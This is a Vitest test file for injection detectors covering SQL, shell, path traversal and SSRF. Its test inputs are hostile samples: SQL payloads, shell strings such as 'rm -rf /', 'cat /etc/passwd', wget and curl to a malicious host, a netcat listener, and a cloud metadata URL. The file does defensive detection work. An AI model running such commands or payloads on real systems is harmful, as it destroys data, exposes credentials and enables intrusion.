import { describe, it, expect } from 'vitest';
import {
  detectSqlInjection,
  detectShellInjection,
  detectPathTraversal,
  detectSsrf
} from './injection';

describe('detectSqlInjection', () => {
  it('should return false for safe inputs', () => {
    expect(detectSqlInjection('hello world').detected).toBe(false);
    expect(detectSqlInjection('12345').detected).toBe(false);
    expect(detectSqlInjection('or maybe not').detected).toBe(false);
  });

  it('should detect UNION SELECT', () => {
    expect(detectSqlInjection('UNION SELECT * FROM users')).toEqual({ detected: true, pattern: 'union\\s+select' });
    expect(detectSqlInjection('union select 1,2,3')).toEqual({ detected: true, pattern: 'union\\s+select' });
  });

  it('should detect OR 1=1', () => {
    expect(detectSqlInjection('admin\' OR 1=1 --')).toEqual({ detected: true, pattern: 'or\\s+1\\s*=\\s*1' });
    expect(detectSqlInjection('or 1 = 1')).toEqual({ detected: true, pattern: 'or\\s+1\\s*=\\s*1' });
  });

  it('should detect DROP TABLE', () => {
    expect(detectSqlInjection('DROP TABLE users;')).toEqual({ detected: true, pattern: 'drop\\s+table' });
  });

  it('should detect INSERT INTO', () => {
    expect(detectSqlInjection('INSERT INTO users (name) VALUES ("a")')).toEqual({ detected: true, pattern: 'insert\\s+into' });
  });

  it('should detect DELETE FROM', () => {
    expect(detectSqlInjection('DELETE FROM users WHERE id = 1')).toEqual({ detected: true, pattern: 'delete\\s+from' });
  });

  it('should detect UPDATE SET', () => {
    expect(detectSqlInjection('UPDATE users SET name = "b"')).toEqual({ detected: true, pattern: 'update\\s+.*?\\s+set' });
  });

  it('should detect EXEC(', () => {
    expect(detectSqlInjection('EXEC(something)')).toEqual({ detected: true, pattern: 'exec\\s*\\(' });
  });

  it('should detect xp_cmdshell', () => {
    expect(detectSqlInjection('EXEC master..xp_cmdshell')).toEqual({ detected: true, pattern: 'xp_cmdshell' });
  });

  it('should detect SLEEP(', () => {
    expect(detectSqlInjection('SLEEP(10)')).toEqual({ detected: true, pattern: 'sleep\\s*\\(' });
  });

  it('should detect BENCHMARK(', () => {
    expect(detectSqlInjection('BENCHMARK(1000000,MD5(1))')).toEqual({ detected: true, pattern: 'benchmark\\s*\\(' });
  });

  it('should detect trailing comments', () => {
    expect(detectSqlInjection('admin\' --')).toEqual({ detected: true, pattern: '--\\s*$' });
  });
});

describe('detectShellInjection', () => {
  it('should return false for safe inputs', () => {
    expect(detectShellInjection('safe text').detected).toBe(false);
    expect(detectShellInjection('ls').detected).toBe(false);
  });

  it('should detect semi-colon command chains', () => {
    expect(detectShellInjection('; ls')).toEqual({ detected: true, pattern: ';\\s*(?:ls|cat|rm|pwd|whoami|echo)' });
    expect(detectShellInjection('hello;cat /etc/passwd')).toEqual({ detected: true, pattern: ';\\s*(?:ls|cat|rm|pwd|whoami|echo)' });
  });

  it('should detect pipe command chains', () => {
    expect(detectShellInjection('text | pwd')).toEqual({ detected: true, pattern: '\\|\\s*(?:ls|cat|rm|pwd|whoami|echo)' });
  });

  it('should detect backtick command execution', () => {
    expect(detectShellInjection('`whoami`')).toEqual({ detected: true, pattern: '`.*?`' });
  });

  it('should detect subshell execution', () => {
    expect(detectShellInjection('$(ls -la)')).toEqual({ detected: true, pattern: '\\$\\(.*?\\)' });
  });

  it('should detect AND command chains', () => {
    expect(detectShellInjection('test && echo 1')).toEqual({ detected: true, pattern: '&&\\s*(?:ls|cat|rm|pwd|whoami|echo)' });
  });

  it('should detect OR command chains', () => {
    // Note: It might match the single pipe pattern first due to array order
    expect(detectShellInjection('false || rm -rf /').detected).toBe(true);
  });

  it('should detect shell paths', () => {
    expect(detectShellInjection('/bin/sh -i')).toEqual({ detected: true, pattern: '\\/bin\\/sh' });
    expect(detectShellInjection('/bin/bash')).toEqual({ detected: true, pattern: '\\/bin\\/bash' });
  });

  it('should detect network utilities', () => {
    expect(detectShellInjection('wget http://malicious.com')).toEqual({ detected: true, pattern: '\\bwget\\b' });
    expect(detectShellInjection('curl -O http://malicious.com')).toEqual({ detected: true, pattern: '\\bcurl\\b' });
    expect(detectShellInjection('nc -l -p 8080')).toEqual({ detected: true, pattern: '\\bnc\\b' });
    expect(detectShellInjection('ncat -l 8080')).toEqual({ detected: true, pattern: '\\bncat\\b' });
  });
});

describe('detectPathTraversal', () => {
  it('should return false for safe inputs', () => {
    expect(detectPathTraversal('/var/www/html').detected).toBe(false);
    expect(detectPathTraversal('filename.txt').detected).toBe(false);
  });

  it('should detect standard path traversal', () => {
    expect(detectPathTraversal('../etc/passwd')).toEqual({ detected: true, pattern: '\\.\\.\\/' });
    expect(detectPathTraversal('..\\Windows\\System32')).toEqual({ detected: true, pattern: '\\.\\.\\\\' });
  });

  it('should detect URL encoded path traversal', () => {
    expect(detectPathTraversal('%2e%2e/etc/passwd')).toEqual({ detected: true, pattern: '%2e%2e' });
    expect(detectPathTraversal('%252e%252e/etc/passwd')).toEqual({ detected: true, pattern: '%252e' });
  });

  it('should detect null byte injection', () => {
    expect(detectPathTraversal('image.png%00.php')).toEqual({ detected: true, pattern: '%00' });
  });
});

describe('detectSsrf', () => {
  it('should return false for safe inputs', () => {
    expect(detectSsrf('https://google.com').detected).toBe(false);
    expect(detectSsrf('8.8.8.8').detected).toBe(false);
  });

  it('should detect localhost IPv4', () => {
    expect(detectSsrf('http://127.0.0.1/admin')).toEqual({ detected: true, pattern: '127\\.0\\.0\\.1' });
  });

  it('should detect private network 10.x.x.x', () => {
    expect(detectSsrf('http://10.0.0.1/')).toEqual({ detected: true, pattern: '10\\.\\d+\\.\\d+\\.\\d+' });
  });

  it('should detect private network 172.16.x.x to 172.31.x.x', () => {
    expect(detectSsrf('http://172.16.0.1/')).toEqual({ detected: true, pattern: '172\\.(?:1[6-9]|2\\d|3[0-1])\\.\\d+\\.\\d+' });
    expect(detectSsrf('http://172.31.255.255/')).toEqual({ detected: true, pattern: '172\\.(?:1[6-9]|2\\d|3[0-1])\\.\\d+\\.\\d+' });
  });

  it('should detect private network 192.168.x.x', () => {
    expect(detectSsrf('http://192.168.1.1/')).toEqual({ detected: true, pattern: '192\\.168\\.\\d+\\.\\d+' });
  });

  it('should detect link-local 169.254.x.x', () => {
    expect(detectSsrf('http://169.254.169.254/latest/meta-data/')).toEqual({ detected: true, pattern: '169\\.254\\.\\d+\\.\\d+' });
  });

  it('should detect localhost IPv6', () => {
    expect(detectSsrf('http://[::1]/')).toEqual({ detected: true, pattern: '\\[::1\\]' });
  });
});
